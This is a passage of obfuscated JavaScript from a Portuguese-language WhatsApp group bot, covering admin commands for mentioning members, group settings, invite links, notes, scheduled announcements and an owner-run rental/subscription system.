                  return _0x50740b("Não pode utilizar comandos nesse comando");
                }
                members_id = [];
                teks = _0x23d865.length > 1 ? _0x3ac611.slice(8).trim() : '';
                teks += "\n\n";
                for (let _0x3565e7 of groupMembers) {
                  teks += "╠➥ @" + _0x3565e7.id.split('@')[0] + "\n";
                  members_id.push(_0x3565e7.id);
                }
                _0x1106fd(teks, members_id, true);
              } catch {
                _0x50740b("ERROR!!");
              }
              break;
            case "marcarwa":
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (_0x11e99e.includes('' + _0x141936)) {
                  return _0x50740b("Não pode utilizar comandos nesse comando");
                }
                members_id = [];
                teks = _0x23d865.length > 1 ? _0x3ac611.slice(10).trim() : '';
                teks += "\n\n";
                for (let _0x4656f3 of groupMembers) {
                  teks += "╠➥ https://wa.me/" + _0x4656f3.id.split('@')[0] + "\n";
                  members_id.push(_0x4656f3.id);
                }
                const _0x44df7e = {
                  text: teks
                };
                const _0x53243b = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x44df7e, _0x53243b);
              } catch {
                _0x50740b("ERROR!!");
              }
              break;
            case "nomegp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              blat = _0x23d865.join(" ");
              _0x5196be.groupUpdateSubject(_0x346d97, '' + blat);
              const _0x1909ab = {
                text: "Sucesso, alterou o nome do grupo"
              };
              const _0x21381c = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x1909ab, _0x21381c);
              break;
            case "descgp":
            case "descriçãogp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              blabla = _0x23d865.join(" ");
              _0x5196be.groupUpdateDescription(_0x346d97, '' + blabla);
              const _0x9c4512 = {
                text: "Sucesso, alterou a descrição do grupo"
              };
              const _0x8152aa = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x9c4512, _0x8152aa);
              break;
            case "setfotogp":
            case "fotogp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x54198a) {
                return _0x50740b("Use: " + (_0x141936 + _0x267d4b) + " <Marque uma foto>");
              }
              _0x150891 = _0x54198a ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0xd2050d.message.imageMessage;
              rane = getRandom('.' + (await getExtension(_0x150891.mimetype)));
              buffimg = await getFileBuffer(_0x150891, "image");
              fs.writeFileSync(rane, buffimg);
              medipp = rane;
              const _0x164a86 = {
                url: medipp
              };
              _0x5196be.updateProfilePicture(_0x346d97, _0x164a86);
              _0x50740b("Foto do grupo alterada com sucesso");
              break;
            case "linkgp":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              try {
                ppurl = await _0x5196be.profilePictureUrl(_0x346d97, "image");
              } catch {
                ppurl = "https://telegra.ph/file/6ca032835ed7a16748b6f.jpg";
              }
              linkgp = await _0x5196be.groupInviteCode(_0x346d97);
              const _0x3043d4 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': "https://chat.whatsapp.com/" + linkgp,
                'contextInfo': {
                  'externalAdReply': {
                    'title': '' + _0x3baffe,
                    'body': '',
                    'reviewType': "PHOTO",
                    'showAdAttribution': true,
                    'thumbnailUrl': ppurl,
                    'sourceUrl': "https://chat.whatsapp.com/" + linkgp,
                    'mediaType': 0x2
                  }
                }
              }, _0x3043d4);
              break;
            case "recrutar":
              if (!_0x3f2f63) {
                return _0x50740b("Só ADM");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              rcrt = _0x11e99e.replace(new RegExp("[()+-/ +/]", 'gi'), '') + "@s.whatsapp.net";
              linkgc = await _0x5196be.groupInviteCode(_0x346d97);
              const _0x1efca4 = {
                url: logoslink.logo
              };
              _0x5196be.sendMessage(rcrt, {
                'image': _0x1efca4,
                'caption': "Clique no símbolo a cima da imagem para entrar no grupo...",
                'contextInfo': {
                  'externalAdReply': {
                    'title': "- Clique aqui para participar do grupo",
                    'body': '',
                    'reviewType': "PHOTO",
                    'thumbnailUrl': logoslink.logo,
                    'sourceUrl': "https://chat.whatsapp.com/" + linkgc,
                    'mediaType': 0x2
                  }
                }
              });
              _0x50740b("Convite de recrutamento do usuário, foi enviado para o privado dele com sucesso...");
              break;
            case "anotar":
            case "tirar_nota":
            case "rmnota":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x267d4b == "anotar") {
                var [_0x531404, _0x49ba8d] = _0x11e99e.trim().split('|');
                if (!_0x531404 || !_0x49ba8d || !_0x11e99e.trim().includes('|')) {
                  return _0x50740b("Digite o título da anotação e o texto que deseja anotar..\nExemplo: " + _0x141936 + "anotar cachorro|Cachorros são bom pra comer na Venezuela...");
                }
                _0x49ba8d = _0x49ba8d.replace(/(\r\n|\n|\r)/gm, "\n");
                if (JSON.stringify(anotar).includes(_0x346d97)) {
                  var _0xb83e05 = anotar.map(_0x404b5b => _0x404b5b.grupo).indexOf(_0x346d97);
                  if (JSON.stringify(anotar[_0xb83e05].puxar).includes(_0x531404)) {
                    var _0x17f438 = anotar[_0xb83e05].puxar.map(_0x7d9a66 => _0x7d9a66.nota).indexOf(_0x531404);
                    if (anotar[_0xb83e05].puxar[_0x17f438].nota == _0x531404) {
                      return _0x50740b("Esta anotação já está inclusa, utilize outro título.. Ou você pode tirar com\n" + _0x141936 + "tirar_nota " + _0x531404);
                    }
                  }
                }
                if (!JSON.stringify(anotar).includes(_0x346d97)) {
                  const _0x1188e4 = {
                    nota: _0x531404,
                    anotacao: _0x49ba8d
                  };
                  const _0x29430b = {
                    grupo: _0x346d97,
                    puxar: [_0x1188e4]
                  };
                  anotar.push(_0x29430b);
                  fs.writeFileSync("./DADOS/json/anotar.json", JSON.stringify(anotar));
                  _0x50740b("Anotação registrada com sucesso...");
                } else {
                  const _0x38cbb6 = {
                    nota: _0x531404,
                    anotacao: _0x49ba8d
                  };
                  anotar[_0xb83e05].puxar.push(_0x38cbb6);
                  fs.writeFileSync("./DADOS/json/anotar.json", JSON.stringify(anotar));
                  _0x50740b("Anotação registrada com sucesso...");
                }
              } else {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite qual anotação deseja tirar pelo título..");
                }
                if (JSON.stringify(anotar).includes(_0x346d97)) {
                  var _0xb83e05 = anotar.map(_0x58b2e9 => _0x58b2e9.grupo).indexOf(_0x346d97);
                  if (JSON.stringify(anotar[_0xb83e05].puxar).includes(_0x11e99e)) {
                    var _0x17f438 = anotar[_0xb83e05].puxar.map(_0xf620cb => _0xf620cb.nota).indexOf(_0x11e99e);
                  }
                }
                if (0 > anotar[_0xb83e05].puxar.map(_0x522646 => _0x522646.nota).indexOf(_0x11e99e)) {
                  return _0x50740b("Esta nota não está inclusa, verifique com atenção...");
                }
                anotar[_0xb83e05].puxar.splice(_0x17f438, 1);
                fs.writeFileSync("./DADOS/json/anotar.json", JSON.stringify(anotar));
                _0x50740b("Anotação " + _0x11e99e + " tirada com sucesso...");
              }
              break;
            case "rm_aviso":
            case "rm_avisos":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              for (_0x3194f3 of black_) {
                var _0x515fd5 = _0x3194f3;
              }
              if (!JSON.stringify(_0x515fd5.PUXAR).includes(_0x346d97)) {
                return _0x50740b("Nenhum aviso foi registrado nesse grupo, utilize o comando " + _0x141936 + "rg_aviso");
              }
              _0x515fd5.PUXAR.splice(_0x515fd5.PUXAR.indexOf(_0x346d97));
              fs.writeFileSync("./DADOS/datab/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
              _0x50740b("Avisos referente a esse grupo, foi tirado de todos os horários registrados..");
              break;
            case "rg_aviso":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              var [_0x4dae0e, _0x26fdfe] = _0x11e99e.trim().split('|');
              if (!_0x11e99e.trim().includes(':') && !_0x11e99e.trim().includes('|')) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " 12:00|Boa tarde a todos, prestem atenção nas regras do grupo\n\neste exemplo.. Ele vai enviar todos os dias as 12:00 da tarde a mensagem que você registrou, já se você quer trocar o horário.. Só refazer o comando\nSe você quer apagar o aviso do grupo, apenas coloque " + _0x141936 + "rm_aviso");
              }
              var _0x5f093a = black_?.["map"](_0x13420f => _0x13420f?.["hora"])?.["indexOf"](_0x4dae0e);
              if (JSON.stringify(black_[_0x5f093a]?.["PUXAR"])?.["includes"](_0x346d97)) {
                black_[_0x5f093a].PUXAR.splice(black_[_0x5f093a].PUXAR.map(_0x30665d => _0x30665d.idgp).indexOf(_0x346d97));
                fs.writeFileSync("./DADOS/datab/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                setTimeout(() => {
                  _0x50740b("O Registro anterior foi apagado e recriou um novo, se deseja continuar\n - Lembre-se que há avisos programados em outros horários, se quiser limpar todos, digite: " + _0x141936 + "rm_avisos");
                }, 500);
              } else {
                if (!JSON.stringify(black_).includes(_0x4dae0e)) {
                  const _0x14867b = {
                    idgp: _0x346d97,
                    msg: _0x26fdfe,
                    avisou: false
                  };
                  const _0x1eda0f = {
                    hora: _0x4dae0e,
                    PUXAR: [_0x14867b]
                  };
                  black_.push(_0x1eda0f);
                  fs.writeFileSync("./DADOS/datab/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                  _0x50740b("Aviso Criado com sucesso..");
                } else {
                  if (!JSON.stringify(black_[_0x5f093a].PUXAR).includes(_0x346d97)) {
                    const _0x46f74e = {
                      idgp: _0x346d97,
                      msg: _0x26fdfe,
                      avisou: false
                    };
                    black_[_0x5f093a].PUXAR.push(_0x46f74e);
                    fs.writeFileSync("./DADOS/datab/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                    _0x50740b("Aviso Criado com sucesso..");
                  }
                }
              }
              break;
            case "rv-forca":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (_0x326cbd[0].forca_inc == false) {
                return _0x50740b("O jogo não foi iniciado.\nDigite " + _0x141936 + "iniciar_forca");
              }
              _0x4b4b15();
              _0x50740b("Forca resetada com sucesso...");
              break;
            case "infoaluguel":
              _0x50740b("Comandos:\n\n1: " + _0x141936 + "aluguel\n\n2: " + _0x141936 + "aluguel_global\n\n3: " + _0x141936 + "rg_aluguel\n\n4: " + _0x141936 + "rm_aluguel\n\n5: " + _0x141936 + "renovar_aluguel\n\n6: " + _0x141936 + "listaaluguel\n\n_1: O primeiro comando: ( " + _0x141936 + "aluguel ) serve para ativar que aquele grupo/usuario só funcionará quando for renovado o aluguel ou determinado o tempo que vai expirar o uso naquele grupo/usuario | Para desativar, só usar o comando novamente.\n\n_2: O segundo comando: ( " + _0x141936 + "aluguel_global ) serve para ativar que todos grupo/usuario só funcionará quando for renovado o aluguel ou determinado o tempo que vai expirar o uso naquele grupo/usuario | Para desativar, só usar o comando novamente.\n\n_3: O terceiro comando: ( " + _0x141936 + "rg_aluguel ) serve para registrar quando o aluguel vai expirar, Exemplos:\n\n" + _0x141936 + "rg_aluguel /30d\n\n" + _0x141936 + "rg_aluguel /24h\n\nd é dias e h é horas, pode por o tempo que quiser.\n\n_4: O quarto comando: ( " + _0x141936 + "rm_aluguel ) serve para tirar o grupo da lista de aluguel, e não funcionarei mais nele.\n\n_5: O quinto comando: ( " + _0x141936 + "renovar_aluguel ) serve para você renovar o novo tempo do grupo, para o funcionamento do bot 100%.\n\n_6: O sexto comando: ( " + _0x141936 + "listaaluguel ) serve para ver todos os usuarios/grupos que estão cok tempo de vencimento, e etc..\n\nBoa sorte.");
              break;
            case "aluguel":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              _0x326cbd[0].rg_aluguel = !_0x326cbd[0].rg_aluguel;
              _0x137e44(_0x326cbd);
              _0x50740b(_0x326cbd[0].rg_aluguel ? "Ativado com sucesso, agora use o comando: " + _0x141936 + "rg_aluguel\nOu então o comando " + _0x141936 + "infoaluguel pra saber como usar o resto." : "Desativado com sucesso.");
              break;
            case "emojigold":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              _0x326cbd[0].emojigold = !_0x326cbd[0].emojigold;
              _0x137e44(_0x326cbd);
              _0x5196be.sendMessage(_0x346d97, {
                'text': _0x326cbd[0].emojigold ? "*Ativado com sucesso*, agora irei mandar o emoji a cada hora para vocês acertarem\n\n*⚠️ATENÇÃO⚠️*\nCaso queira ser marcado nas próximas mensagens do emojigold, utilize " + _0x141936 + "mencgold para ativar. Para desativar, utilize o comando novamente." : "Desativado com sucesso a brincadeira emoji gold",
                'mentions': _0x326cbd[0].emojigold ? groupMembers.map(_0x50523c => _0x50523c.id) : []
              });
              break;
            case "aluguel_global":
            case "aluguelgb":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.rg_aluguelGB = !nescessario.rg_aluguelGB;
              _0x13c255(nescessario);
              _0x50740b(nescessario?.["rg_aluguelGB"] ? "Ativado com sucesso, agora use o comando: " + _0x141936 + "rg_aluguel\nOu então o comando " + _0x141936 + "infoaluguel pra saber como usar o resto." : "Desativado com sucesso..");
              break;
            case "renovar_aluguel":
            case "rn_aluguel":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!nescessario?.["rg_aluguelGB"] && !(_0x89cd51 && _0x326cbd[0]?.["rg_aluguel"])) {
                  return _0x50740b("O aluguel ou aluguelgb não está ativo. Por favor, entre em contato com o dono para ativá-lo.");
                }
                function _0xf7a90() {
                  let _0x540034 = /(\d+)([dhm])/;
                  let _0x163416 = _0x11e99e.trim().match(_0x540034);
                  return _0x163416 || false;
                }
                function _0xa2793b(_0x50d4c5, _0x566f18) {
                  switch (_0x566f18) {
                    case 'd':
                      return _0x50d4c5;
                    case 'h':
                      return _0x50d4c5 / 24;
                    case 'm':
                      return _0x50d4c5 / 1440;
                    default:
                      return false;
                  }
                }
                let _0x83e8b5 = rg_aluguel.findIndex(_0x3c87a2 => _0x3c87a2.id_gp == _0x346d97);
                if (_0x83e8b5 === -1) {
                  return _0x50740b("Este grupo não está na lista de aluguel, use: " + _0x141936 + "listaaluguel para ver os grupos registrados.");
                }
                let _0x4b05f8 = _0xf7a90();
                let _0x33c8e4 = /\d{2}\/\d{2}\/\d{4}/.test(_0x11e99e.trim());
                if (!_0x4b05f8 && !_0x33c8e4) {
                  return _0x50740b("Por favor, forneça o tempo no formato correto. Exemplo: /24h ou /30d ou /10m ou a data no formato DD/MM/YYYY");
                }
                let _0x4a7179 = Math.floor(Date.now() / 1000);
                let _0x2b2cc5 = rg_aluguel[_0x83e8b5].vencimento - _0x4a7179;
                if (_0x33c8e4) {
                  let _0x4cd47a = _0x3745b2(_0x11e99e.trim());
                  if (_0x2b2cc5 <= 0) {
                    rg_aluguel[_0x83e8b5].vencimento = _0x4cd47a;
                  } else {
                    rg_aluguel[_0x83e8b5].vencimento += _0x4cd47a;
                  }
                } else {
                  let _0x420a14 = parseInt(_0x4b05f8[1]);
                  let _0x55c640 = _0x4b05f8[2];
                  let _0x489f94 = _0xa2793b(_0x420a14, _0x55c640);
                  if (!_0x489f94) {
                    return _0x50740b("Unidade de tempo inválida. Use d para dias, h para horas ou m para minutos ou a data no formato DD/MM/YYYY.");
                  }
                  if (_0x2b2cc5 <= 0) {
                    rg_aluguel[_0x83e8b5].vencimento = _0x4a7179 + _0x489f94 * 3600 * 24;
                  } else {
                    rg_aluguel[_0x83e8b5].vencimento += _0x489f94 * 3600 * 24;
                  }
                }
                rg_aluguel[_0x83e8b5].enviado = false;
                rg_aluguel[_0x83e8b5].notificado = false;
                fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel, null, 2));
                let _0x299350 = new Date().toLocaleTimeString("pt-BR");
                _0x50740b("*RENOVADO COM SUCESSO*\n\n*GRUPO: " + _0x3baffe + "*\n*ID: " + _0x346d97 + "*\n*DATA DO VENCIMENTO: " + new Date(rg_aluguel[_0x83e8b5].vencimento * 1000).toLocaleDateString("pt-BR") + "*\n*HORA DO VENCIMENTO: " + new Date(rg_aluguel[_0x83e8b5].vencimento * 1000).toLocaleTimeString("pt-BR") + "*\n*HORA DO REGISTRO: " + _0x299350 + "*\n\n*CASO QUEIRA REMOVER O ALUGUEL UTILIZE O COMANDO RM_ALUGUEL NESTE GRUPO*");
              }
              break;
            case "rg_aluguel":
            case "rgaluguel":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                let _0x32ee50 = _0x11e99e.trim();
                let _0x20565c = /\d{2}\/\d{2}\/\d{4}/.test(_0x32ee50);
                if (_0x20565c) {
                  let _0x17b00a = _0x3745b2(_0x32ee50);
                  let _0x3ae100 = rg_aluguel.findIndex(_0x2f43cb => _0x2f43cb.id_gp == _0x346d97);
                  if (_0x3ae100 === -1) {
                    let _0x49ae92 = _0x346d97.endsWith("@g.us") ? "GRUPO" : "USUÁRIO";
                    let _0x3b1431 = _0x49ae92 === "GRUPO" ? _0x3baffe : _0x671b4b;
                    const _0x2be934 = {
                      id_gp: _0x346d97,
                      nome_: _0x3b1431,
                      vencimento: _0x17b00a,
                      enviado: false
                    };
                    rg_aluguel.push(_0x2be934);
                    fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel, null, 2));
                    await new Promise(_0x2d7211 => setTimeout(_0x2d7211, 1000));
                    let _0x313587 = new Date(_0x17b00a * 1000).toLocaleDateString("pt-BR");
                    let _0x54b989 = new Date(_0x17b00a * 1000).toLocaleTimeString("pt-BR");
                    let _0x2c35ec = new Date().toLocaleTimeString("pt-BR");
                    _0x50740b("*REGISTRO REALIZADO COM SUCESSO*\n\n*" + _0x49ae92 + ": " + _0x3b1431 + "*\n*ID: " + _0x346d97 + "*\n*DATA DO VENCIMENTO: " + _0x313587 + "*\n*HORA DO VENCIMENTO: " + _0x54b989 + "*\n*HORA DO REGISTRO: " + _0x2c35ec + "*\n\n*CASO QUEIRA REMOVER O ALUGUEL UTILIZE O COMANDO RM_ALUGUEL NESTE " + _0x49ae92 + '*');
                  } else {
                    let _0x71a9b9 = new Date(rg_aluguel[_0x3ae100].vencimento * 1000);
                    let _0x19c4fc = _0x71a9b9.toLocaleDateString("pt-BR") + " " + _0x71a9b9.toLocaleTimeString("pt-BR");
                    _0x50740b("Este grupo/usuário já está registrado e vai vencer em: " + _0x19c4fc + ". Caso queira remover este grupo da lista de aluguel antes do tempo, use: " + _0x141936 + "rm_aluguel " + _0x346d97);
                  }
                } else {
                  let _0x56e77d = _0x32ee50.length > 1 && (_0x32ee50.includes('d') || _0x32ee50.includes('h') || _0x32ee50.includes('m')) && _0x32ee50.includes('/');
                  if (!nescessario?.["rg_aluguelGB"] && !_0x326cbd[0].rg_aluguel) {
                    return _0x50740b("Você não ativou o sistema de aluguel para esse grupo, nem global.. Leia como utilizar em " + _0x141936 + "infoaluguel\n\nBoa sorte.");
                  }
                  if (_0x56e77d) {
                    let _0x5470da = Math.floor(Date.now() / 1000);
                    let _0x1b75e0 = _0x32ee50.split('/');
                    let _0x4c7dcf = _0x1b75e0[1].includes('d') ? 86400 : _0x1b75e0[1].includes('h') ? 3600 : _0x1b75e0[1].includes('m') ? 60 : 0;
                    if (_0x4c7dcf === 0) {
                      return _0x50740b("Por favor, forneça o tempo no formato correto. Exemplo: /24h ou /10d ou /30m");
                    }
                    let _0x2f9bc6 = parseInt(_0x1b75e0[1].split(/d|h|m/)[0]);
                    let _0x190f45 = _0x2f9bc6 * _0x4c7dcf;
                    let _0x561a07 = rg_aluguel.findIndex(_0x1d8904 => _0x1d8904.id_gp == _0x346d97);
                    if (_0x561a07 === -1) {
                      let _0x4a1421 = _0x346d97.endsWith("@g.us") ? "GRUPO" : "USUÁRIO";
                      let _0x21e928 = _0x4a1421 === "GRUPO" ? _0x3baffe : _0x671b4b;
                      rg_aluguel.push({
                        'id_gp': _0x346d97,
                        'nome_': _0x21e928,
                        'vencimento': _0x5470da + _0x190f45,
                        'enviado': false
                      });
                      fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel, null, 2));
                      await new Promise(_0x5ba743 => setTimeout(_0x5ba743, 1000));
                      let _0x4eedfb = new Date((_0x5470da + _0x190f45) * 1000).toLocaleDateString("pt-BR");
                      let _0x264f52 = new Date((_0x5470da + _0x190f45) * 1000).toLocaleTimeString("pt-BR");
                      let _0x124522 = new Date().toLocaleTimeString("pt-BR");
                      _0x50740b("*REGISTRO REALIZADO COM SUCESSO*\n\n*" + _0x4a1421 + ": " + _0x21e928 + "*\n*ID: " + _0x346d97 + "*\n*DATA DO VENCIMENTO: " + _0x4eedfb + "*\n*HORA DO VENCIMENTO: " + _0x264f52 + "*\n*HORA DO REGISTRO: " + _0x124522 + "*\n\n*CASO QUEIRA REMOVER O ALUGUEL UTILIZE O COMANDO RM_ALUGUEL NESTE " + _0x4a1421 + '*');
                    } else {
                      _0x50740b("Este grupo já está registrado, e vai vencer em: " + kyun(Math.floor(rg_aluguel[_0x561a07].vencimento) - _0x5470da) + ". Caso queira tirar este grupo da lista de aluguel antes do tempo, use: " + _0x141936 + "rm_aluguel " + _0x346d97);
                    }
                  } else {
                    _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " /24h ou Exemplo: " + (_0x141936 + _0x267d4b) + " /10d ou Exemplo: " + (_0x141936 + _0x267d4b) + " /30m\n\nCom d é dias, h é horas, e m é minutos, então boa sorte..");
                  }
                }
              }
              break;
            case "rm_aluguel":
            case "rmaluguel":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              let _0x3bf3e1 = _0x11e99e.trim() ? _0x11e99e.trim() : _0x346d97;
              let _0x2ab207 = _0x89cd51 ? _0x3baffe : _0x671b4b;
              let _0x13cb51 = rg_aluguel.findIndex(_0x58096e => _0x58096e.id_gp == _0x3bf3e1);
              if (_0x13cb51 === -1) {
                return _0x50740b("Este grupo/número de usuário não está na lista de aluguel.");
              }
              rg_aluguel.splice(_0x13cb51, 1);
              fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel, null, 2));
              _0x50740b("Grupo/Usuário: " + _0x2ab207 + " (" + _0x3bf3e1 + ") foi removido com sucesso da lista de aluguel.");
              break;
            case "listaaluguel2":
            case "lista_aluguel2":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                let _0x2704e0 = _0x11e99e.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
                let _0x2f198b = await _0x5196be.groupFetchAllParticipating();
                let _0x12db4a = Object.entries(_0x2f198b).slice(0).map(_0x560a3e => _0x560a3e[1]);
                let _0xa7c77f = _0x12db4a.filter(_0x48d0d1 => !_0x48d0d1.isCommunity && !_0x48d0d1.isCommunityAnnounce && !_0x48d0d1.isReadOnly);
                _0xa7c77f.sort((_0x8126ee, _0x593938) => _0x8126ee[0] < _0x593938.length);
                let _0x5d78e6 = Math.floor(new Date().getTime() / 1000);
                let _0x482692 = 0;
                let _0x45b108 = '';
                function _0x34d3c7(_0x1bc6d2) {
                  let _0x1104d8 = ["dia", "hora", "minuto", "segundo"];
                  let _0x6cf871 = [86400, 3600, 60, 1];
                  let _0x3007e3 = '';
                  for (let _0x72ec = 0; _0x72ec < _0x1104d8.length; _0x72ec++) {
                    let _0x15c558 = Math.floor(_0x1bc6d2 / _0x6cf871[_0x72ec]);
                    _0x1bc6d2 -= _0x15c558 * _0x6cf871[_0x72ec];
                    if (_0x15c558 > 0) {
                      _0x3007e3 += _0x15c558 + " " + _0x1104d8[_0x72ec] + (_0x15c558 > 1 ? 's' : '') + " ";
                    }
                  }
                  return _0x3007e3.trim();
                }
                function _0x51224b(_0x406bda) {
                  if (_0x406bda === 0) {
                    return '0';
                  }
                  let _0x4557fc = new Date(_0x406bda * 1000);
                  let _0x4a8f33 = String(_0x4557fc.getDate()).padStart(2, '0');
                  let _0x3238f8 = String(_0x4557fc.getMonth() + 1).padStart(2, '0');
                  let _0x46dbf3 = _0x4557fc.getFullYear();
                  return _0x4a8f33 + '/' + _0x3238f8 + '/' + _0x46dbf3;
                }
                let _0x5c0307 = _0xa7c77f.map(_0x64fad2 => _0x64fad2.id);
                let _0x213a03 = rg_aluguel.filter(_0x1755c7 => _0x5c0307.includes(_0x1755c7.id_gp));
                if (_0x2704e0 === "vencido" || _0x2704e0 === "nao_vencido" || _0x2704e0 === "em dia" || !_0x2704e0 || _0x2704e0 === "todos" || _0x2704e0 === "7dias") {
                  if (_0x2704e0 === "vencido" || _0x2704e0 === "nao_vencido") {
                    _0x213a03 = _0x213a03.filter(_0x1b63ea => {
                      let _0xfba01c = _0x1b63ea.vencimento - _0x5d78e6;
                      return _0x2704e0 === "vencido" && _0xfba01c <= 0 || _0x2704e0 === "nao_vencido" && _0xfba01c > 0;
                    });
                  } else {
                    if (_0x2704e0 === "em dia") {
                      _0x213a03 = _0x213a03.filter(_0x375f4b => _0x375f4b.vencimento > _0x5d78e6);
                    } else {
                      if (_0x2704e0 === "7dias") {
                        _0x213a03 = _0x213a03.filter(_0x502c9d => {
                          let _0x58fa5e = _0x502c9d.vencimento - _0x5d78e6;
                          return _0x58fa5e > 0 && _0x58fa5e <= 604800;
                        });
                      }
                    }
                  }
                  _0x482692 = _0x213a03.length;
                  _0x45b108 += "Lista de Usuários/Grupos ( " + _0x482692 + " ) grupos:\n\n";
                  for (let _0x5af1c7 of _0x213a03) {
                    let _0xb724e4 = _0x5af1c7.vencimento - _0x5d78e6;
                    let _0x339b12 = '';
                    let _0x11164a = _0x51224b(_0x5af1c7.vencimento);
                    let _0x5c8f5b = _0x12db4a.find(_0x1ee7bc => _0x1ee7bc.id === _0x5af1c7.id_gp);
                    let _0x4e6fa1 = _0x5c8f5b ? _0x5c8f5b.subject : _0x671b4b ? _0x671b4b : '';
                    if (_0x4e6fa1 && _0x4e6fa1 !== _0x5af1c7.nome_) {
                      _0x5af1c7.nome_ = _0x4e6fa1;
                      let _0x2490c0 = _0x213a03.findIndex(_0x3943d3 => _0x3943d3.id_gp === _0x5af1c7.id_gp);
                      if (_0x2490c0 !== -1) {
                        _0x213a03[_0x2490c0].nome_ = _0x4e6fa1;
                        fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel, null, 2));
                      }
                    }
                    if (_0xb724e4 <= 0) {
                      _0x45b108 += "Nome: " + _0x5af1c7.nome_ + "\nID: " + _0x5af1c7.id_gp + "\nStatus: Inativo\nTempo Restante: Expirado\nData de Vencimento: " + _0x11164a + "\n-----------------------------------------\n";
                    } else {
                      _0x339b12 = _0x34d3c7(_0xb724e4);
                      _0x45b108 += "Nome: " + _0x5af1c7.nome_ + "\nID: " + _0x5af1c7.id_gp + "\nStatus: Ativo\nTempo restante: " + _0x339b12 + "\nData de Vencimento: " + _0x11164a + "\n-----------------------------------------\n";
                    }
                  }
                } else {
                  if (_0x2704e0 === "nao registrado") {
                    let _0x1227a5 = _0xa7c77f.filter(_0x49bccc => !_0x213a03.some(_0x2ffa7e => _0x2ffa7e.id_gp === _0x49bccc.id));
                    _0x482692 = _0x1227a5.length;
                    _0x45b108 += "Lista de Usuários/Grupos ( " + _0x482692 + " ) grupos:\n\n";
                    for (let _0x5443c8 of _0x1227a5) {
                      _0x45b108 += "Nome: " + _0x5443c8.subject + "\nID: " + _0x5443c8.id + "\nStatus: Não registrado\n-----------------------------------------\n";
                    }
                  } else {
                    if (_0x2704e0 === "contatos") {
                      let _0x17f294 = rg_aluguel.filter(_0x38dfee => _0x38dfee.id_gp.endsWith("@s.whatsapp.net"));
                      _0x482692 = _0x17f294.length;
